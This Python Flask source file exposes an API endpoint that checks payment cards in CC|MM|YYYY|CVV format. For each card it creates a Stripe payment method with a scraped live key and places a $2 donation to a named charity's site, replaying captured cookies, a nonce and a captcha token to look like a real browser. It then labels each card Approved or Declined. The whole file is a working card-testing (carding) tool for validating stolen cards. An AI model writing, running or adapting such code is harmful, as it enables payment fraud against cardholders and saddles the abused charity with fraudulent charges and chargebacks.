from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

API_KEY = "new_api_key_123"  # Changed API key

def process_card(card_data):
    """Process the card data and make the Stripe requests"""
    try:
        # Parse card data
        parts = card_data.split('|')
        if len(parts) != 4:
            return {"error": "Invalid card format. Use CC|MM|YYYY|CVV"}
        
        cc, mm, yy, cvv = parts
        
        # First request to Stripe to create payment method
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        data = f'type=card&billing_details[name]=Test+User&billing_details[email]=test%40gmail.com&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=123+Main+St&billing_details[address][line2]=Apt+4B&billing_details[address][postal_code]=10001&billing_details[address][state]=NY&billing_details[phone]=5551234567&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=2f6c56ae-bcbe-4539-b1e2-bddfc0588c067767c2&muid=e0637a21-af34-4e00-b014-231889949f6c39271c&sid=e813a76b-3bb3-45e4-bd84-521ba6d77bb855ebe1&payment_user_agent=stripe.js%2F9e39ef88d1%3B+stripe-js-v3%2F9e39ef88d1%3B+card-element&referrer=https%3A%2F%2Fpipelineforchangefoundation.com&time_on_page=199841&key=pk_live_51IK8KECy7gKATUV9t1d0t32P2r0P54BYaeaROb0vL6VdMJzkTpvZc6sIx1W7bKXwEWiH7iQT3gZENUMkYrdvlTte00PxlESxxt&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiK2lpeXVWYWo4WDhlOEkzM3J6eUd0WjNnV2FoZnFaZUorQkFsbVVleTl2MERRWGZYeXdFNkhheWJqVFNxNmZwdWpyR2Zoc1E1YmJUVEJYQU52T2RUN1U1QzE4bFRTaVJQdDFIY2F4ekl5QlFHZmJuQzBoUVY1Q3dkOWpyMURMRTdSdnljcC9xSWhyM0xlOTJRQWEzVndzYnVSUjNuZGZUS2R5VUpmaXFncXNkQ1cwYmkvSlVuUWFHc3dKR1BTeFhGbjN0WUNPc003UUF6T0kwRWpFcjdyME1SdFZqZ3VjNzJWK0ZUeHk4Q2wyL3VrdXpZdUVWOXYwRmdzRWdQSTFKUStZNmNCdkx0Ukc3YnRLSkh5eDJlNngxRlAyekdqUnhpY2ZRS1BSZktIZHBpbVVyZG9MMVJjK1ZTVFJTZ2YxRGxNak1WU1VmTjIvc2pSK2U4dkpadkNueTJ4TnZuMkNxWnpiYTZQWDNYNVRsWW5IK2ZkdE1tY2d3QXJuV2VZTFNHdURFRGg4bjlTTnVJd2VFKzg4em5FSGtqdUxpRjUvTUdHdklxMityVjRkWDZYRHA5SkRmcFQwL3o3NllDMk5Xc05OdDExVU1NYzFzV2dVUk94TENucnpjdWpEQ0hmWW9ONGN6bWhXWTdLaVJNMWdVc3hqWFkrZ2F4cEkzNktOQUdITzBMSVBiUG9QbFZ5R0ZnTWd4OTh1UjdPS3RCbXliQU1lWGVlS2FCSjVNR3d6emxLWURGc1BDaXJ3KzQyYXM2WEtNTTRrMDFvOC8wcEs2VExYdGFrUFcvdVJQU3pnRGY1cTRSTUJGWmZ4R3RUMWxObzVjakhKRkNMMEkyRzF0QUlaa1J1VmFETzlneHJobm4zT1dIWUhJRW9hTkxnaDNjWlgxbUdjM3cvYXFYV3NoU2hKbGFwQU5qZW80TjQrOVJML3lKSjFCTjdUNFdRdzVHSmh2a0wzZks3N2h4YWJ1VEVJcWI4TmJVdGVDTnlmUnB3azNEVHhmL1Y5bHhQU2lCaHJXWmhVT1kvLzBGUG5xNWtyb21HY1VuZk5TNWRnUkJOTVdSM0VFZTBoUkRWRy9ndUFsbUZWRnpiZlRhTitJeHlCRXNzSU9IWk9Id0pELzQxall6cjBualFSZVoycUpQUktvN3FYMVNQRHdkUWw4WVBvUXNGVWcrcUVOOTBCeldra2dvSWJ5S2tlZUtDVEJoVEZUSGFUdDhPQU5VTng2K2xLQ29pMDZVUWdoeFB6VEUxNWlpeDVWMWV2SzQyNUlkUittV1QzT0FEdVRFREI0YUMvYTBhYncvVHlKdVRCUS9tbkZpckJ1bnBrYmhtYkwyK2RBS0FHdzBWMXB0RHhUbFEzOTJvMWErVnRsamZYZ29lZFhMdzNvVlBCbGlmRXRzeWg1c0VubEZPUHBhQk1Lb1d4NDJyQkh3TmRaRnFVbDM3UzE2bUU2WmF2cm1zYUpkb0wzUVA5TmZGMCtvYWNPci81c253QnJxdi90TkhqM3RNVndQelBCQi8zQkppN2xqTHA1TnZDeHRTaFBlMGtxSXZOOElPNmYvWFQyYmo4c281L1gzWDNuZ3ZiSE9kaTJDUzQ1Qysrd2pGb2R2RVA3NHdxL3JiODdrNWcvUE5ya3BsNzd6SmRUc1FoZjAvU1cwNm12UHFWNk1hdFIwWWY3ZExyRm92Q3BwUVJraUY1ckQzbXV0L1dhVlpSeUdCL2Qyd2w1YWVlelA2bmxJcHVOOGZRa21aa0UxT3ZhaXc1Qjc2TEMvMVdKanBvMTRuUzNkMW43T2thQ0ZhdjJSM0FURjh6TGRaTTFTQkdJdDVQVm5aUkI2bHFNRENpQW1zV0dtL3B5Y0lTd1NYYXcrWHpZcTVZSmxhcmYyc1VPczRGL3pFRU5GZEVreS9vQlZyVVhIRzR6bVpWTkROMkZycGhFekQ0Ymx5Ymk0TzRBaDQzMjNVRW95OTBTbjRMY2cyc3NvVjNDZ1FsYVpCZFdGR0xEVW54TEx0aUNSYjVLTFRLdldMUGFGOWNiVVF2UVI3THFQR0VmQmh2Zjd0emtsaFFJM2o2UVNJcUtaUndFd2lXYlQ0U1hDRllkS21vRjhRNlRjN0ppYXVQaTNiWHhDc09IZVRITXIzK1pXNFM2YmRjOC8relY0cGg0blJyc0NRbjNtRTJVZmh3U1ZhaUM3S0w4QndqM2ROcW5rb0Z5dnFUdWRiZnJsV242UU1tbndDd0lTZURmRDhiSWZhNy80cXZOYllsZkUwZjI1SWNuYmlqSWhHdmc1TDZlN3lOa2R0NlRzTjVVMjM4UHZ5OVJjUGpTT3lWSG1oKzRsaG55VUpzeURuZVBBYzRNdTZ6VmxNbmNXUVpEOTVsZVV4dVNQREpmMjcxVllHMUx5MGE3OWh0cFhuWWw3M3JPQ1NrZG15N1JYbFZ6VlhaZHl4L0dTSnhwc3JoNjc3R0hMN0pVOTNyQWdMNUVSWlNwUG9rbDkzSnVjY09pZzBMUUNRblZvejU4bitzaXdoUWFuQlNkanU0cWxkbVpRUDRJMmlHRDNkakZxdEN5UHFBRi92YVV2L1NwMjZUNFNEemhiUGxycThlOEFPcVFlTDFwNFBBcy9aNEVxakRCUDBzR3M3dmhxN3FlSS9xYzljbkExQW1zMElGdXhzc1NVNWtzNllHZkJVZmpidFNWZjQ1NnJ5UVQ5Qm5QLzVjaFlEUGNhbXR0cTFFMkpESDlLVUtOeWtiVDNGbWdrS21yM3FvSmpOODY1MUcvczBWc29lNzQ2UU5GUURaZFJleENwbzRzYzdRPT0iLCJleHAiOjE3NDcwNDM0OTEsInNoYXJkX2lkIjoyNTkxODkzNTksImtyIjoiZmIxNzFmZSIsInBkIjowLCJjZGF0YSI6Ikt2SXpLYm5Mb2c1UktrSGgzbXRac21OckZiWWYzTnFQU0o4SjMrRUwwQXZMUmdNQzVnMWJzc2Fpd2wyVCtkaGlOeWsrTWExTit2aGJ0MDVZbTNTV3pScDAvZGRaUnNtOEM3dW9tVm1wV1VCa2tVV2Exa1VTUGFlb1JSZy9HMFRXZGc2OTQ1YUtOeEVnWjAyNmh4WFN2RTdqdFNhRERkdW5RZTBDZjI0bmJkSlQzWVZvVEM0alMvZzdmNFJ5R2NUaFNUL1FydWNFZERYRjBjVHcifQ.2L4KoT2jmV2XON4wZoTGOi7SMKyCoTH_GkQGXwBKUqA'

        payment_method_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        payment_method_data = payment_method_response.json()
        
        if 'error' in payment_method_data:
            return {
                "cc": f"{cc}|{mm}|{yy}|{cvv}",
                "response": payment_method_data,
                "status": "Declined"
            }
        
        payment_method_id = payment_method_data.get('id')
        
        # Second request to complete the donation
        cookies = {
            'tk_or': '%22%22',
            'tk_r3d': '%22%22',
            'tk_lr': '%22%22',
            '__stripe_mid': 'e0637a21-af34-4e00-b014-231889949f6c39271c',
            'charitable_session': '22a0799f90a3ca37f6a153219d824c9f||86400||82800',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-05-04%2016%3A43%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2025-05-04%2016%3A43%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
            '__stripe_sid': 'e813a76b-3bb3-45e4-bd84-521ba6d77bb855ebe1',
            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2Fdonate%2F',
        }

        headers = {
            'authority': 'pipelineforchangefoundation.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://pipelineforchangefoundation.com',
            'referer': 'https://pipelineforchangefoundation.com/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'charitable_form_id': '6821c360910f9',
            '6821c360910f9': '',
            '_charitable_donation_nonce': '88c5ce850e',
            '_wp_http_referer': '/donate/',
            'campaign_id': '690',
            'description': 'Donate to Pipeline for Change Foundation',
            'ID': '0',
            'recurring_donation': 'once',
            'custom_recurring_donation_amount': '',
            'recurring_donation_period': 'once',
            'donation_amount': 'custom',
            'custom_donation_amount': '2.00',
            'first_name': 'Testing',
            'last_name': 'User',
            'email': 'test@gmail.com',
            'address': '123 Main St',
            'address_2': 'Apt 4B',
            'city': 'New York',
            'state': 'NY',
            'postcode': '10001',
            'country': 'US',
            'phone': '5551234567',
            'gateway': 'stripe',
            'stripe_payment_method': payment_method_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

        donation_response = requests.post(
            'https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        
        donation_data = donation_response.json()
        
        if donation_response.status_code == 200 and donation_data.get('success'):
            return {
                "cc": f"{cc}|{mm}|{yy}|{cvv}",
                "response": "successful",
                "status": "Approved"
            }
        else:
            return {
                "cc": f"{cc}|{mm}|{yy}|{cvv}",
                "response": donation_data,
                "status": "Declined"
            }
            
    except Exception as e:
        return {
            "cc": f"{cc}|{mm}|{yy}|{cvv}",
            "response": str(e),
            "status": "Error"
        }

@app.route('/key=<key>/cc=<card_data>', methods=['GET'])
def check_card(key, card_data):
    """Endpoint to check credit card"""
    if key != API_KEY:
        return jsonify({"error": "Invalid API key"}), 401
    
    if not re.match(r'^\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4}$', card_data):
        return jsonify({"error": "Invalid card format. Use CC|MM|YYYY|CVV"}), 400
    
    result = process_card(card_data)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
